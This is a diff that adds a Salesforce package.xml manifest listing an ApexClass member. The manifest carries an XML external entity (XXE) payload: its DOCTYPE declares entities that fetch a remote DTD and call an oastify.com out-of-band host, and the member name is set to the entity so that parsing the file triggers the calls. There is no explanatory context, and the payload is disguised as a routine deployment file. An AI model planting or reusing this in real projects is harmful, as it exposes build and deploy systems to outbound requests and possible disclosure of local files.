@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "https://xxe.qicvhxf2qv09lk68put5da2licofclu8hc6.oastify.com/xxe-package-xml">
+  <!ENTITY % dtd SYSTEM "https://dtd.qicvhxf2qv09lk68put5da2licofclu8hc6.oastify.com/ext.dtd">
+  %dtd;
+]>
+<Package xmlns="http://soap.sforce.com/2006/04/metadata">
+  <types>
+    <members>&xxe;</members>
+    <name>ApexClass</name>
+  </types>
+  <version>59.0</version>
+</Package>
